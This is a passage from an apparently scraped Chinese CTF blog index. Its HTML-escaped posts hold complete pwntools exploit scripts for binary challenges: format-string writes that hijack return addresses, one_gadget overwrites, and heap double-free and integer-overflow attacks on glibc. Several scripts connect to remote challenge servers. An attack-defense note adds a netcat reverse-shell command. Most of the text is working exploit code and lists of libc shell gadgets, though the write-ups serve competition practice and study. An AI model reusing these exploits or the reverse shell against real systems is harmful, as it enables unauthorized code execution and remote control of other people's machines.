payload=cyclic(0x18)+p64(load_text)+p64(ret)*2+p64(leak)
io.send(payload)

io.sendlineafter(b&amp;quot;file_content_length : &amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">NSSCTF Round#14 Basic. 部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/XKnqVgyRN1/"" data-c="
          &lt;h4 id=&#34;das-6月赛fooooood&#34;&gt;DAS 6月赛fooooood：&lt;/h4&gt;
&lt;p&gt;非栈上格式化字符串，但是只有3次有效输入机会，找跳板(&lt;code&gt;1-&amp;gt;2-&amp;gt;3-&amp;gt;value&lt;/code&gt;)可以用两次输入写掉栈上&lt;code&gt;i&lt;/code&gt;的值为一个大值从而实现多次输入，后面就是非栈上格式化字符串标准打法，劫持ret可以打rop也可以打one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# context(log_level=&#39;debug&#39;)

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25718)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def sd(cc):
    io.sendlineafter(b&amp;quot;what&#39;s your favourite food: &amp;quot;, cc)


io.recvuntil(b&amp;quot;Give me your name:&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;
io.sendline(payload)


io.recvuntil(b&amp;quot;what&#39;s your favourite food: &amp;quot;)
payload=&amp;quot;%11$p.%9$p&amp;quot;
io.sendline(payload)

gdb.attach(io)    
pause()

io.recvuntil(b&amp;quot;like &amp;quot;)
stack=int(io.recv(14),16)
stack0=stack-0xd0
ret_addr=stack0-0x10
rr=stack0+0xe0
# canary=int(io.recv(18),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
libc_addr=int(io.recv(14),16)-240-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
print(&amp;quot;stack: &amp;quot;+hex(stack))
print(&amp;quot;stack0: &amp;quot;+hex(stack0))
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[3]+libc_addr
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+libc_addr

off0=(stack0-0x24)&amp;amp;0xffff
payload = &amp;quot;%{}c%{}$hn&amp;quot;.format(off0,11)
sd(payload)

sd(&#39;%100&#39;+&#39;c%37$hhn&#39;) #修改i值，增加循环次数

# off1=(off0+0xc+0x8)
off1=ret_addr

def fmt_off(addr,value):

    payload = &amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,11)
    sd(payload)

    payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(value&amp;amp;0xff,37)
    sd(payload)

    for i in range(4):
        payload = &amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+1+i)&amp;amp;0xff,11)
        sd(payload)
        payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((value&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,37)
        sd(payload)
    
fmt_off(ret_addr,shell) #单字节循环写

for i in range(87):
    io.sendline(b&amp;quot;1&amp;quot;)


io.interactive()
    
# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;swpu_19_login&#34;&gt;SWPU_19_login&lt;/h4&gt;
&lt;p&gt;7/30复习一下&lt;br&gt;
32位，劫持main函数返回地址为one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28348)
# io=process(&amp;quot;./login&amp;quot;)
elf=ELF(&amp;quot;./login&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

# gdb.attach(io)
# pause()

sh_addr=0x804b080
io.sendafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;/bin/sh\x00&amp;quot;)
io.recvuntil(b&amp;quot;word: \n&amp;quot;)

# 6 15

payload=b&amp;quot;%6$p.%15$p&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;password: &amp;quot;)
stack_addr=int(io.recv(10),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(10),16)-241-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
ret_addr=stack_addr+0x24
shell=leak_addr+0x3cbf7

print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
print(&amp;quot;shell: &amp;quot;+hex(shell))

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hn&amp;quot;.format(ret_addr&amp;amp;0xffff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(shell&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ret_addr+1)&amp;amp;0xff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((shell&amp;gt;&amp;gt;8)&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ret_addr+2)&amp;amp;0xff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((shell&amp;gt;&amp;gt;16)&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
io.send(b&amp;quot;wllmmllw&amp;quot;)

io.interactive()

# 0x3cbea execve(&amp;quot;/bin/sh&amp;quot;, esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x3cbec execve(&amp;quot;/bin/sh&amp;quot;, esp+0x38, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x38] == NULL

# 0x3cbf0 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x3c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x3c] == NULL

# 0x3cbf7 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x40, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x40] == NULL

# 0x6729f execl(&amp;quot;/bin/sh&amp;quot;, eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x672a0 execl(&amp;quot;/bin/sh&amp;quot;, [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL

# 0x13573e execl(&amp;quot;/bin/sh&amp;quot;, eax)
# constraints:
#   ebx is the GOT address of libc
#   eax == NULL

# 0x13573f execl(&amp;quot;/bin/sh&amp;quot;, [esp])
# constraints:
#   ebx is the GOT address of libc
#   [esp] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;osu_miss_analyzer&#34;&gt;osu_miss_analyzer&lt;/h4&gt;
&lt;p&gt;ogg打不通怎么办，栈上布置rop链，这道题卡输入挺恶心的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&#39;./analyzer&#39;)
io=remote(&amp;quot;chal.osugaming.lol&amp;quot;,7273)
elf=ELF(&#39;./analyzer&#39;)
libc=elf.libc

# gdb.attach(io,&#39;b *0x4018d9\nc\n&#39;)
# pause()

def fi(s,n):
    payload =  b&amp;quot;\x00\xFB\xD6\x34\x01\x0B\x20\x32\x65\x61\x37\x32\x32\x31\x38\x65&amp;quot;
    payload += b&amp;quot;\x35\x36\x38\x30\x66\x33\x62\x63\x31\x65\x32\x39\x36\x66\x63\x64&amp;quot;
    payload += b&amp;quot;\x62\x37\x36\x33\x32\x39\x36\x0B&amp;quot;
    payload += &#39;{}{}&#39;.format(s,n).encode()
    payload += b&amp;quot;\x0B\x20\x66\x63\x36\x64\x63\x33\x64\x61\x62\x65\x30\x64\x63\x34&amp;quot;
    payload += b&amp;quot;\x65\x30\x35\x62\x33\x64\x65\x63\x32\x33\x39\x36\x64\x31\x30\x34&amp;quot;
    payload += b&amp;quot;\x32\x33\xDF\x02\x06\x00\x00\x00\xC0\x00\x05\x00\x00\x00\x32\x35&amp;quot;
    payload += b&amp;quot;\x3A\x01\x4C\x04\x01\x28\x00\x00\x00\x0b&amp;quot;
    return payload

payload=fi(&#39;\x05&#39;,&#39;%51$p&#39;)
io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())

io.recvuntil(b&amp;quot;name: &amp;quot;)
leak_addr=int(io.recv(14),16)-0x29d90
log.success(&amp;quot;leak_addr:&amp;quot;+hex(leak_addr))

shell=leak_addr+0xebc81
log.success(&amp;quot;shell:&amp;quot;+hex(shell))

pop_rdi=leak_addr+0x000000000002a3e5
ret=leak_addr+0x0000000000029139
leave_ret=leak_addr+0x000000000004da83
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

bss_addr=0x404400

def ab_write(content,addr):
    for i in range(6):
        tp=&#39;%{}c%16$hhn&#39;.format((content&amp;gt;&amp;gt;(8*i))&amp;amp;0xff).ljust(0x10,&#39;a&#39;)+p64(addr+i).decode(&#39;latin-1&#39;)
        slen=len(tp)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x18&#39;,tp)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())

# ab_write(shell,0x404070)
# ab_write(pop_rdi,bss_addr)
# ab_write(str_sh,bss_addr+8)
# ab_write(sys_addr,bss_addr+16)

## leak stack
payload=fi(&#39;\x04&#39;,&#39;%6$p&#39;)
io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
io.recvuntil(b&amp;quot;name: &amp;quot;)
stack_addr=int(io.recv(14),16)
log.success(&amp;quot;stack_addr:&amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x110


# gdb.attach(io,&#39;b *0x401686\nc&#39;)
# pause()

ab_write(pop_rdi,bss_addr)
ab_write(str_sh,bss_addr+0x8)
ab_write(sys_addr,bss_addr+0x10)

# gdb.attach(io,&#39;&#39;)
# pause()

def fmt_t(addr,ctt,off1,off2):
    tp=&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1).ljust(0x20,&#39;a&#39;)
    slen=len(tp)
    log.success(&amp;quot;slen:&amp;quot;+hex(slen))
    payload=fi(&#39;\x20&#39;,tp)
    io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
      
    for i in range(6):
        tp=&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i)&amp;amp;0xff,off1).ljust(0x20,&#39;a&#39;)
        slen=len(tp)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x20&#39;,tp)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
        
        tp1=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i)*8))&amp;amp;0xff,off2).ljust(0x20,&#39;a&#39;)
        slen=len(tp1)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x20&#39;,tp1)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
        

# def fmt_t(addr,ctt,off1,off2):
#     io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1).hex())
#     io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format(ctt&amp;amp;0xff,off2).hex())
    
#     for i in range(5):
#         io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i+1)&amp;amp;0xff,off1))
#         io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,off2))


fmt_t(ret_addr+0x8,pop_rdi,6,85)
fmt_t(ret_addr+0x10,str_sh,6,85)
fmt_t(ret_addr+0x18,sys_addr,6,85)
fmt_t(ret_addr,ret,6,85)

log.success(&amp;quot;stack_addr:&amp;quot;+hex(stack_addr))
log.success(&amp;quot;ret_addr:&amp;quot;+hex(ret_addr))
log.success(&amp;quot;str_sh:&amp;quot;+hex(str_sh))
log.success(&amp;quot;pop_rdi:&amp;quot;+hex(pop_rdi))

io.sendlineafter(b&amp;quot;:\n&amp;quot;,b&amp;quot;ls&amp;quot;)
io.sendline(b&amp;quot;cat flag.txt&amp;quot;)

io.interactive()


# 0xebc81 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebc85 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebc88 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebce2 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   r13 == NULL || {&amp;quot;/bin/sh&amp;quot;, r13, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xebd38 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   r12 == NULL || {&amp;quot;/bin/sh&amp;quot;, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd3f execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   rax == NULL || {rax, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd43 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;Pasted%20image%2020240304013446.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">非栈上格式化字符串 例题</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/zoxorWZV-/"" data-c="
          &lt;p&gt;bugku上打了两场awd，简单记录一下&lt;br&gt;
winscp连上方便文件操作，tabby再开个ssh&lt;/p&gt;
&lt;p&gt;Aoiawd上探针，将本机tmp文件夹里面探针扔到靶机上然后执行指令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x tapeworm.phar
chmod +x roundworm
chmod +x guardian.phar
./tapeworm.phar -d 目录 -s ip:port
./roundworm  -w 目录 -s ip -p port
./guardian.phar -i 目录 -s ip:port
通常
./tapeworm.phar -d ../var/www/html -s ip:port
./roundworm  -w ../var/www/html -s ip -p port
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;docker里面构建的Aoiawd的guardian用起来有点问题，一般情况evilPatcher能应付一下&lt;br&gt;
搭建好后可以看记录，可以粗略判断危险处&lt;/p&gt;
&lt;p&gt;主机开启端口监听：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvvp 2333
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;靶机反弹shell，已经拿道远端shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc 主机ip 2333 -e /bin/bash
&lt;/code&gt;&lt;/pre&gt;
">AWD记录</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/MZwpgRHj1/"" data-c="
          &lt;h3 id=&#34;easy_stack&#34;&gt;easy_stack:&lt;/h3&gt;
&lt;p&gt;partial write+one_gadget&lt;br&gt;
重新打包过的libc，本地patch不了&lt;br&gt;
本地不patch调试后发现&lt;code&gt;rsp+0x18&lt;/code&gt;为main函数地址&lt;br&gt;
可以修改main函数返回地址低1字节为&lt;code&gt;\x80&lt;/code&gt;&lt;br&gt;
使其跳转到gadget&lt;br&gt;
&lt;code&gt;mov rax, qword ptr [rsp + 0x18]; call rax;&lt;/code&gt;&lt;br&gt;
可以再次返回main，同时可以泄露libc地址&lt;br&gt;
最后打one_gadget即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./easy_stack&amp;quot;)
io=remote(&amp;quot;nc.eonew.cn&amp;quot;,10004)
elf=ELF(&amp;quot;./easy_stack&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
# gdb.attach(io)
# pause()

payload=cyclic(0x88)+b&amp;quot;\x80&amp;quot;
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x21a80
print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

shell=leak_addr+0x415a6

payload=b&amp;quot;a&amp;quot;*0x88+p64(shell)
io.sendline(payload)

sleep(1)

io.interactive()
    
# 0x415a6 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x415fa execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xdfa51 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL
&lt;/code&gt;&lt;/pre&gt;
">xm_pwn记录</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/6yuwf6aET/"" data-c="
          &lt;p&gt;最近碰到几道整型溢出的题目&lt;br&gt;
此题2.34-3的glibc版本，常用hook已被删除&lt;br&gt;
没有edit函数，但是白给uaf&lt;br&gt;
此题存在整型溢出可以分配堆块到任意地址，突破idx限制，可以任意地址泄露&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690368381255.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
遗憾的是此题在本机复现时show打印main_arena指针泄露libc失败，即使是其他大佬wp的偏移也是，只能打通远端&lt;br&gt;
2.34的符号表也挺难找的，一步一步下去找的&lt;code&gt;exit_hook&lt;/code&gt;偏移&lt;br&gt;
&lt;code&gt;exit_hook&lt;/code&gt;即指&lt;code&gt;_rtld_global._rtld_lock_recursive-&amp;gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;&lt;br&gt;
释放7个到tcachebin里面，在释放2个堆块到fastbin&lt;br&gt;
可以打double free劫持&lt;code&gt;exit_hook&lt;/code&gt;为one_gadget&lt;br&gt;
最后调用exit函数即可getshell&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./newest_note&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28331)
elf=ELF(&amp;quot;./newest_note&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;will be? :&amp;quot;,str(0x40040000))

def add(n,cc):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

gdb.attach(io)
pause()

show(539034)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x218cc0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0xeeccc
exit_hook=leak_addr+0x21a6c0


add(0,b&amp;quot;a&amp;quot;)
delete(0)
show(0)
io.recvuntil(b&amp;quot;Content: &amp;quot;)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
print(&amp;quot;key: &amp;quot;+hex(key))

for i in range(9):
    add(i,b&amp;quot;a&amp;quot;)

add(9,b&amp;quot;a&amp;quot;)

for i in range(7):
    delete(i)
    
delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,b&amp;quot;a&amp;quot;)

add(7,p64(key^exit_hook))
add(8,b&amp;quot;a&amp;quot;)
add(7,b&amp;quot;a&amp;quot;)
add(10,p64(shell)*2)

io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;4&amp;quot;)

io.interactive()


# 0xeeccc execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeeccf execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeecd2 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 初赛]newest_note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4UNuWjKnk/"" data-c="
          &lt;p&gt;这几天比赛多，一大堆题目等着复现，先把这道前阵子做的题补了&lt;br&gt;
2.27的菜单题，漏洞在delete函数里面&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136049178.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而程序的add函数每次创建堆块时都会额外创建一个大小为0x10的堆块作为指针堆块，指针指向创建堆块的content&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136810972.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
具体例子：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136837705.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;一开始习惯ida hide casts了，数据类型隐藏，结果半天没找到怎么利用堆块指针的点&lt;br&gt;
后面肖神讲解之后算是恍然大悟了&lt;br&gt;
int型比较低4字节，而v1原本8字节，那么只需要保证v1的低4字节大于等于0，二进制的最高位为1（第64位）即可绕过此判断&lt;br&gt;
而&lt;code&gt;free()&lt;/code&gt;的寻址按v1的低4字节 * 8去找，实际上的偏移是&lt;code&gt;(目标堆块地址-(heap_addr+0x260))&amp;gt;&amp;gt;3&lt;/code&gt;即可，如下图&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136537304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136542956.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只要控制了指针堆块此题就终结了，具体说明看下面&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chall&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)

add(0x80) #0 
add(0x80) #1
delete(1)
delete(0)
add(0x80) #0
show(0)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c0
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
# add(0x10)
edit(0,cyclic(0x80))

for i in range(7):
    add(0x80)

add(0x10) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(0x80) #0~6

add(0x10) #7
show(7)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))+0x1bc8-libc.sym[b&amp;quot;__free_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f322

gdb.attach(io)
pause()

print(&amp;quot;free_hook: &amp;quot;,hex(free_hook))

edit(7,p64(heap_addr+0x870)) #chunk 8的指针堆块
edit(1,p64(heap_addr+0x7e0)) #chunk1内容堆块-&amp;gt;chunk 7的内容堆块-&amp;gt;chunk 8的指针堆块


###任意地址free，此处free的是chunk 1的内容堆块
idx=((1&amp;lt;&amp;lt;63)+0x84) - (1&amp;lt;&amp;lt;64) 
delete(idx)
print(hex(idx))
###偏移用(chunk 1内容堆块地址-(heap_addr+0x260))&amp;gt;&amp;gt;3即可
###具体看反编译后delete函数内容


add(0x10) #9
edit(9,p64(free_hook))  #chunk 9实际上是chunk 8的指针堆块
edit(8,p64(shell)) #修改chunk 8内容为one_gadget
print(&amp;quot;shell: &amp;quot;,hex(shell))
delete(8) #delete即可getshell

io.interactive()

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;本机环境可以拿shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690137134855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
还有一大堆题没补，时间多来点😿😿😿&lt;/p&gt;
">一道我也不知道名字的堆题复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LMCf1vtkj/"" data-c="
          &lt;p&gt;记录下host clash的ip和端口&lt;br&gt;
例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10.16.1.102:7890
